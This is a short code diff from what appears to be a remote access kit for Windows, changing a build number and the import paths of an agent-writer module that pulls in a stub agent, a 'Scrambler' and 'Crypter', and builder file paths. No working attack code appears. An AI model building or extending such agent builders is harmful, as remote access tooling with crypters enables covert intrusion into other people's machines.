@@ -10,13 +10,13 @@
 #             [A Remote Access Kit for Windows]
 # Author: SlizBinksman
 # Github: https://github.com/slizbinksman
-# Build:  1.0.2
+# Build:  1.0.21
 # -------------------------------------------------------------
-from ..builder.stub import QWireAgent
-from ..builder.encryption import Scrambler,Crypter
-from ..utils.file_paths import BuilderPath,CFGFilePath
-from ..utils.utils import Validation,Notifications
-from ..logging.logging import LoggingUtilitys
+from ..windows10.stub import QWireAgent
+from ..utils.encryption import Scrambler,Crypter
+from core.utils.file_paths import BuilderPath,CFGFilePath
+from core.utils.utils import Validation,Notifications
+from core.logging.logging import LoggingUtilitys
 
 class AgentWriter():
 
